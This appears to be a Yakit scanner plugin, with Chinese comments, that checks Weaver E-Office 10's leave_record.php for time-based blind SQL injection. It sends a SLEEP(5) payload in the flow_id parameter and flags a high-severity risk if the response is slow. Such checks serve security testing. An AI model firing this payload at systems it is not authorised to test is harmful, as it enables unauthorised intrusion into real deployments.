yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    // 构造 SQL 注入的 payload
    payload = `/eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%285%29%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10`

    packet = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1`

    // 记录请求开始的时间
    start_time = time.Now()

    // 发送 GET 请求进行 SQL 注入
    rsp, req, _ = poc.HTTP(packet, 
        poc.params({
            "target": addr,
            "payload": payload
        }), 
        poc.https(isTls), 
        poc.redirectTimes(0)
    )

    // 计算响应时间
    response_time = time.Since(start_time)

    // 判断响应时间是否超过5秒，来检测是否存在SQL注入漏洞
    if response_time.Seconds() > 5 {
        yakit.Info("%v 发现可能的 泛微 EOffice 10 SQL 注入漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("泛微 EOffice 10 SQL 注入漏洞"),
            risk.severity("high"),
            risk.titleVerbose("泛微 EOffice 10 leave_record.php SQL 注入漏洞"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.cve("no cve")
        )
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // 处理匹配结果
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
